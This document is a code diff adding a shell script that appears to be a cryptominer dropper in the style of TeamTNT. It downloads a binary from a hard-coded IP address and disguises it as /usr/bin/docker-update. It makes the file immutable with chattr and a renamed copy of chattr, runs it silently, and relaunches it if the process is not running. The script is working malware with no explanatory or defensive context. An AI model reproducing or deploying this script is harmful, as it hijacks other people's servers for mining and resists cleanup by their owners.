@@ -1,0 +1,30 @@
+#!/bin/sh
+
+function downloadxmin(){
+wget -q http://85.214.149.236:443/sugarcrm//banner.php -O /usr/bin/docker-update
+chmod +x /usr/bin/docker-update 2>/dev/null 1>/dev/null
+chattr +i /usr/bin/docker-update 2>/dev/null 1>/dev/null
+tntrecht +i /usr/bin/docker-update 2>/dev/null 1>/dev/null
+}
+
+function startxmin(){
+xminpid=`pidof /usr/bin/docker-update` 2>/dev/null 1>/dev/null
+
+if [ -z "${xminpid}" ]; then
+    #echo "xmin not running! starting now!"
+    /usr/bin/docker-update 2>/dev/null 1>/dev/null
+else
+	#echo "xmin is running"
+	echo " "
+fi
+}
+
+
+if [ -f /usr/bin/docker-update ] ; then
+	#echo 'xmin found'
+	startxmin
+else
+	#echo 'xmin not found'
+	downloadxmin
+	startxmin
+fi
